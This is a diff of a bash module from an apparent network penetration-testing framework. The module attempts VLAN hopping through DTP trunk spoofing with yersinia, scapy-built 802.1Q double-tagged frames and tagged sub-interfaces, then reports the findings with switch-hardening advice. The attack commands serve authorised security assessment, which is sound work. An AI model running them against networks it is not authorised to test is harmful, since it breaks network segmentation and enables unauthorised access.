@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="VLAN Hopping"
+# CATEGORY="C"
+# DEPS="none"
+# CRITICAL="no"
+# TOOLS="nmap,ip"
+# DESC="Attempt 802.1Q double-tagging and DTP spoofing to reach other VLANs"
+# REQS="managed_iface"
+# PCAP="yes"
+# DECODE="none"
+
 #===============================================================================
 #  modules/c3_vlan_hopping.sh
 #  C3: VLAN Hopping Attack ★CRITICAL★
@@ -26,6 +37,7 @@
 #===============================================================================
 
 run_c3() {
+    set -uo pipefail
     local total_steps=6
     local evidence_prefix="${SESSION_EVIDENCE_DIR}/c3"
 
@@ -33,12 +45,14 @@ run_c3() {
     log_step 1 $total_steps "Verifying tools and loading B3 data"
     update_tc_progress 1 $total_steps "Checking"
 
+    check_module_dependencies "C3" || return 1
+
     local has_yersinia=true
     local has_scapy=true
 
     if ! command -v yersinia &>/dev/null; then
         has_yersinia=false
-        log_warn "${TOOL_PATHS[yersinia]} not available — DTP attack testing limited"
+        log_warn "yersinia not available — DTP attack testing limited"
     fi
     if ! command -v scapy &>/dev/null && ! python3 -c "import scapy" 2>/dev/null; then
         has_scapy=false
@@ -65,10 +79,10 @@ run_c3() {
         b3_data=$(load_tc_result "B3")
 
         # Get native VLAN from CDP/LLDP
-        native_vlan=$(echo "$b3_data" | ${TOOL_PATHS[jq]} -r '.native_vlans[0] // ""')
+        native_vlan=$(echo "$b3_data" | run_fg jq -r '.native_vlans[0] // ""')
         while IFS= read -r vlan; do
             [[ -n "$vlan" && "$vlan" != "null" ]] && target_vlans+=("$vlan")
-        done < <(echo "$b3_data" | ${TOOL_PATHS[jq]} -r '.native_vlans[]' 2>/dev/null)
+        done < <(echo "$b3_data" | run_fg jq -r '.native_vlans[]' 2>/dev/null)
 
         if [[ -n "$native_vlan" ]]; then
             log_info "Native VLAN from B3: ${native_vlan}"
@@ -122,9 +136,7 @@ run_c3() {
     } > "$dtp_file"
 
     # Start packet capture
-    ${TOOL_PATHS[tcpdump]} -i "$iface" -w "$capture_file" "vlan or (ether[20:2] == 0x2004)" &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "c3_tcpdump" "${TOOL_PATHS[tcpdump]}" -i "$iface" -w "$capture_file" "vlan or (ether[20:2] == 0x2004)"
 
     if [[ "$has_yersinia" == "true" ]]; then
         log_cmd "${TOOL_PATHS[yersinia]} dtp -attack 1 -interface ${iface}"
@@ -132,7 +144,7 @@ run_c3() {
 
         # Send DTP desirable frames
         start_countdown 30 "Sending DTP trunk negotiation frames"
-        run_attack_tool --timeout 30 --cmd "${TOOL_PATHS[yersinia]} dtp -attack 1 -interface \"$iface\""
+        timeout 30 "${TOOL_PATHS[yersinia]}" dtp -attack 1 -interface "$iface" >/dev/null 2>&1 || true
         stop_countdown
 
         # Check if trunk was negotiated by looking for VLAN-tagged frames
@@ -141,8 +153,8 @@ run_c3() {
         vlan_frames=$(timeout 10 ${TOOL_PATHS[tcpdump]} -i "$iface" -c 5 "vlan" 2>/dev/null | wc -l) || true
 
         if [[ $vlan_frames -gt 0 ]]; then
-            local dtp_vulnerable="true"
-            local trunk_negotiated="true"
+            dtp_vulnerable="true"
+            trunk_negotiated="true"
             log_result "CRITICAL" "DTP trunk negotiation SUCCEEDED — port became a trunk!"
             echo "RESULT: TRUNK NEGOTIATED — VULNERABLE" >> "$dtp_file"
         else
@@ -151,13 +163,13 @@ run_c3() {
         fi
     else
         # Manual DTP frame using raw socket (simplified)
-        log_info "${TOOL_PATHS[yersinia]} not available — attempting manual DTP frame"
+        log_info "yersinia not available — attempting manual DTP frame"
         echo "Yersinia not available. Manual DTP test limited." >> "$dtp_file"
 
         # Check if any DTP frames were observed (from B3 or passively)
         if has_tc_results "B3"; then
             local dtp_count
-            dtp_count=$(echo "$b3_data" | ${TOOL_PATHS[jq]} '.dtp_frames // 0')
+            dtp_count=$(echo "$b3_data" | run_fg jq '.dtp_frames // 0')
             if [[ $dtp_count -gt 0 ]]; then
                 dtp_vulnerable="true"
                 log_result "FINDING" "DTP frames detected in B3 — port may be trunk-negotiable"
@@ -201,13 +213,13 @@ run_c3() {
             # Target: gateway of target VLAN (guess common patterns)
             local target_gw
             if [[ "$target_vlan" -lt 256 ]]; then
-                local target_gw="10.${target_vlan}.0.1"
+                target_gw="10.${target_vlan}.0.1"
             else
-                local target_gw="10.0.${target_vlan}.1"
+                target_gw="10.0.${target_vlan}.1"
             fi
 
             local scapy_script
-            local scapy_script=$(cat <<SCAPY_EOF
+            scapy_script=$(cat <<SCAPY_EOF
 from scapy.all import *
 import sys
 
@@ -229,7 +241,7 @@ SCAPY_EOF
             )
 
             local scapy_result
-            local scapy_result=$(echo "$scapy_script" | timeout 10 python3 2>/dev/null || true)
+            scapy_result=$(echo "$scapy_script" | timeout 10 python3 2>/dev/null || true)
             echo "  VLAN ${target_vlan}: ${scapy_result:-sent}" >> "$double_tag_file"
         done
 
@@ -238,21 +250,22 @@ SCAPY_EOF
 
         # Look for ICMP replies in the capture
         local icmp_replies
-        local icmp_replies=$(${TOOL_PATHS[tshark]} -r "$capture_file" -Y "icmp.type == 0" -T fields -e ip.src 2>/dev/null | sort -u || true)
+        ensure_user_ownership "$capture_file"
+        icmp_replies=$(run_as_user tshark -r "$capture_file" -Y "icmp.type == 0" -T fields -e ip.src 2>/dev/null | sort -u || true)
 
         if [[ -n "$icmp_replies" ]]; then
-            local double_tag_vulnerable="true"
+            double_tag_vulnerable="true"
             while IFS= read -r reply_ip; do
                 [[ -z "$reply_ip" ]] && continue
                 log_result "CRITICAL" "Double-tagging response from ${reply_ip}!"
-                vlans_accessible=$(echo "$vlans_accessible" | ${TOOL_PATHS[jq]} --arg v "$reply_ip" '. += [$v]')
+                vlans_accessible=$(echo "$vlans_accessible" | run_fg jq --arg v "$reply_ip" '. += [$v]')
             done <<< "$icmp_replies"
         else
             log_info "No responses to double-tagged frames (expected if properly configured)"
         fi
     else
         # Manual VLAN interface approach
-        log_info "scapy not available — testing VLAN tagging via ${TOOL_PATHS[ip]} link"
+        log_info "scapy not available — testing VLAN tagging via run_fg ip link"
 
         for target_vlan in "${target_vlans[@]}"; do
             check_abort || return 1
@@ -260,36 +273,36 @@ SCAPY_EOF
             local vlan_iface="${iface}.${target_vlan}"
 
             # Try to create VLAN sub-interface
-            ${TOOL_PATHS[ip]} link add link "$iface" name "$vlan_iface" type vlan id "$target_vlan" 2>/dev/null || continue
-            ${TOOL_PATHS[ip]} link set "$vlan_iface" up 2>/dev/null || continue
-            ${TOOL_PATHS[ip]} addr add "169.254.${RANDOM:0:2}.${RANDOM:0:2}/16" dev "$vlan_iface" 2>/dev/null || true
+            run_fg ip link add link "$iface" name "$vlan_iface" type vlan id "$target_vlan" 2>/dev/null || continue
+            run_fg ip link set "$vlan_iface" up 2>/dev/null || continue
+            run_fg ip addr add "169.254.${RANDOM:0:2}.${RANDOM:0:2}/16" dev "$vlan_iface" 2>/dev/null || true
 
             log_info "Created VLAN interface ${vlan_iface} (VLAN ${target_vlan})"
 
             # Test reachability on this VLAN
             local vlan_gw
             if [[ "$target_vlan" -lt 256 ]]; then
-                local vlan_gw="10.${target_vlan}.0.1"
+                vlan_gw="10.${target_vlan}.0.1"
             else
-                local vlan_gw="10.0.${target_vlan}.1"
+                vlan_gw="10.0.${target_vlan}.1"
             fi
 
             if ping -c 2 -W 2 -I "$vlan_iface" "$vlan_gw" &>/dev/null; then
-                local double_tag_vulnerable="true"
+                double_tag_vulnerable="true"
                 log_result "CRITICAL" "VLAN ${target_vlan} reachable via tagged frames! Gateway ${vlan_gw} responded."
-                vlans_accessible=$(echo "$vlans_accessible" | ${TOOL_PATHS[jq]} --arg v "${target_vlan}" '. += [$v]')
+                vlans_accessible=$(echo "$vlans_accessible" | run_fg jq --arg v "${target_vlan}" '. += [$v]')
                 echo "  VLAN ${target_vlan}: REACHABLE (${vlan_gw}) ← CRITICAL" >> "$double_tag_file"
             else
                 echo "  VLAN ${target_vlan}: Not reachable (${vlan_gw})" >> "$double_tag_file"
             fi
 
             # Clean up VLAN interface
-            ${TOOL_PATHS[ip]} link delete "$vlan_iface" 2>/dev/null || true
+            run_fg ip link delete "$vlan_iface" 2>/dev/null || true
         done
     fi
 
     # Stop capture
-    
+    stop_process "c3_tcpdump"
     validate_pcap "$capture_file" "VLAN hopping attack traffic capture"
 
     #--- Step 4: Analyze Q-in-Q support ---
@@ -302,12 +315,12 @@ SCAPY_EOF
     local qinq_supported="unknown"
     if [[ -f "$capture_file" ]]; then
         local qinq_frames
-        local qinq_frames=$(${TOOL_PATHS[tshark]} -r "$capture_file" -Y "vlan.id" 2>/dev/null | wc -l) || true
+        qinq_frames=$(run_as_user tshark -r "$capture_file" -Y "vlan.id" 2>/dev/null | wc -l) || true
         if [[ $qinq_frames -gt 0 ]]; then
-            local qinq_supported="yes"
+            qinq_supported="yes"
             log_info "${qinq_frames} VLAN-tagged frames observed in capture"
         else
-            local qinq_supported="no"
+            qinq_supported="no"
         fi
     fi
 
@@ -328,7 +341,7 @@ SCAPY_EOF
 
         # Check if IP forwarding is enabled on gateway (traceroute with TTL=1)
         local ttl_test
-        local ttl_test=$(ping -c 1 -t 1 "$GATEWAY_IP" 2>&1 || true)
+        ttl_test=$(ping -c 1 -t 1 "$GATEWAY_IP" 2>&1 || true)
         if echo "$ttl_test" | grep -q "Time to live exceeded"; then
             log_result "INFO" "Gateway forwards packets (TTL exceeded) — PVLAN proxy may be possible"
         fi
@@ -343,29 +356,29 @@ SCAPY_EOF
     local recommendations=""
 
     local vlans_accessed
-    vlans_accessed=$(echo "$vlans_accessible" | ${TOOL_PATHS[jq]} 'length')
+    vlans_accessed=$(echo "$vlans_accessible" | run_fg jq 'length')
 
     if [[ "$trunk_negotiated" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: DTP trunk negotiation succeeded — the target port can be converted to a trunk, providing access to all VLANs. "
-        local recommendations="IMMEDIATE: Set all target-facing ports to 'switchport mode access' and 'switchport nonegotiate'. Disable DTP globally if possible. "
+        result_status="FINDING"
+        result_summary="CRITICAL: DTP trunk negotiation succeeded — the target port can be converted to a trunk, providing access to all VLANs. "
+        recommendations="IMMEDIATE: Set all target-facing ports to 'switchport mode access' and 'switchport nonegotiate'. Disable DTP globally if possible. "
     fi
 
     if [[ "$double_tag_vulnerable" == "true" ]]; then
-        local result_status="FINDING"
+        result_status="FINDING"
         result_summary+="CRITICAL: 802.1Q double-tagging attack succeeded — ${vlans_accessed} VLAN(s) accessible. "
         recommendations+="Ensure the native VLAN on trunk ports is NOT used as the target VLAN. Use an unused VLAN as native VLAN. Enable 'vlan dot1q tag native' on trunk ports. "
     fi
 
     if [[ "$dtp_vulnerable" == "true" && "$trunk_negotiated" != "true" ]]; then
-        local result_status="FINDING"
+        result_status="FINDING"
         result_summary+="DTP frames detected on the target port — trunk negotiation risk exists. "
         recommendations+="Disable DTP on target-facing ports with 'switchport nonegotiate'. "
     fi
 
     if [[ "$result_status" == "SECURE" ]]; then
-        local result_summary="No VLAN hopping vulnerabilities detected. DTP trunk negotiation failed. Double-tagging did not reach other VLANs. Port is properly configured as access mode."
-        local recommendations="No action needed. Maintain 'switchport mode access' and 'switchport nonegotiate' on target ports."
+        result_summary="No VLAN hopping vulnerabilities detected. DTP trunk negotiation failed. Double-tagging did not reach other VLANs. Port is properly configured as access mode."
+        recommendations="No action needed. Maintain 'switchport mode access' and 'switchport nonegotiate' on target ports."
     fi
 
     local result_json
@@ -373,7 +386,7 @@ SCAPY_EOF
     evidence_register_file "c3_double_tag_results.txt"
     evidence_register_file "c3_vlan_hopping.pcap"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    result_json=$(run_fg jq -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "DTP: ${dtp_vulnerable}, Trunk: ${trunk_negotiated}, Double-tag: ${double_tag_vulnerable}, VLANs: ${vlans_accessed}" \
@@ -395,7 +408,8 @@ SCAPY_EOF
             native_vlan: $native_vlan,
                     }')
 
-    save_tc_result "C3" "$result_json"
+    save_tc_result "C3" "$result_json" 1 1 1 1 1 1 1 0 1 1 0
+    save_session_state
 
     # Display summary
     echo ""
